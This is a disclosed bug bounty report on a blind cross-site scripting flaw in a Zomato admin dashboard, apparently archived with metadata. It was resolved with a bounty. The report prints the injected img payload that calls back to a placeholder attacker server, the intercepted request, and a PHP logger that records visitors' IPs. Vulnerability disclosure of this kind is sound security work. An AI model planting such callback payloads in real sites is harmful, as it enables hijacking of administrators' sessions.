---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2019-05-01
submitted: 2018-12-12T14:17:59.211Z
bounty_usd: 500
votes: 102
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "khoidv1"
source: "https://hackerone.com/reports/461272"
title: "[www.zomato.com] Blind XSS in one of the admin dashboard"
---
# [www.zomato.com] Blind XSS in one of the admin dashboard

> **Severity:** High | **Bounty:** 500 USD | **Votes:** 102 | **Program:** Eternal | **Disclosed:** 2019-05-01

- Report: [https://hackerone.com/reports/461272](https://hackerone.com/reports/461272)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2018-12-12T14:17:59.211Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Admin dasboard ████ from user has XSS Vul

## Steps To Reproduce:
  1. Login ██████
  1. Go to ███ function and intercept request
Post data: "><img src="http://<my_server_ip>/zomato.php?c=zomato_xss" />

```
POST ████ HTTP/1.1
X-Zomato-App-Version-Code: 5610001
██████████
███████
X-Zomato-API-Key: ███████
X-App-Language: &lang=en&android_language=en&android_country=VN
X-Zomato-App-Version: 561
X-Network-Type: wifi
X-Present-Long: ███████
X-Zomato-UUID: ████████
X-O2-City-Id: 35
User-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering
X-Access-Token: █████
X-Device-Pixel-Ratio: 1.5
X-City-Id: 35
X-Device-Width: 720
Content-Type: application/x-www-form-urlencoded
Akamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;
X-Client-Id: zomato_android_v2
X-Present-Lat: ██████
██████
X-Device-Height: 1280
Content-Length: 156
Host: api.zomato.com
Connection: close

█████="><img+src%3d"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss"+/>█████████
```

 1.  File **zomato.php** on my server:

```
<?php
$time = date('Y-m-d H:i:s', time());
$refer = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$c = isset($_GET['c']) ? $_GET['c']: '0';
file_put_contents("log.txt","Time: ". $time ."IP: ". $ip." Referer: ".$refer. "C: ". $c . "\n", FILE_APPEND);
?>
```
 1. XSS triggered when Admin viewed the ███████.

 1. Result in file **log.txt** time UTC

```
Time: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss
Time: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss
```

I captured 2 ip from India.
Please verify for me.

## Impact

* Steal admin cookies.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **2018-12-14** @khoidv1: Thanks for your bounty :). Can I disclose this bug?
- **2018-12-14** @prateek_0490-zomato: @khoiasd - We can do the disclosure once it's fixed :) Will let you know once we have an update.

Prateek
- **Report Resolved**
- **2018-12-17** @khoidv1: Yes, I confirm,  this bug may have been fixed, I don't receive any request to my server. So if this admin dasboard is public, can I have a test credentials for confirm and test other bug?
Can I disclosure a summary about this report. Thank you.
- **Agreed On Going Public**
- **Report Title Updated**
- **Report Vulnerability Types Updated**
- **Agreed On Going Public**
- **Report Became Public**
